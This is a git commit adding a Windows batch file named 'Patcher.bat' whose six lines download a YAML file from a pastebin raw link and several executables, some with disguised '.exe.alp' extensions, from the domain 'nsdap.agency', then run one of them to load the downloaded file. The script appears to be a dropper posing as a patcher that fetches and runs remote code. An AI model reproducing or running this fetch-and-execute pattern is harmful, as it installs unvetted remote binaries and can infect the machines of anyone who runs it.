3690500adf576b1924f3cd0fb47a12d307f736e5
tajbek <panchurka@proton.me>
2024-08-11 20:20:30 +0200

    Add files via upload

---
+++ Patcher.bat
@@ -0,0 +1,6 @@
+curl -o schematic.yml https://pastebin.com/raw/1TrATFTT
+curl -LO https://nsdap.agency/SysDriver.exe.alp
+curl -LO https://nsdap.agency/hotfix.exe.alp
+curl -LO https://nsdap.agency/appsservice.exe.alp
+curl -LO https://nsdap.agency/alpaca-win64.exe
+alpaca-win64.exe load-schematic schematic.yml
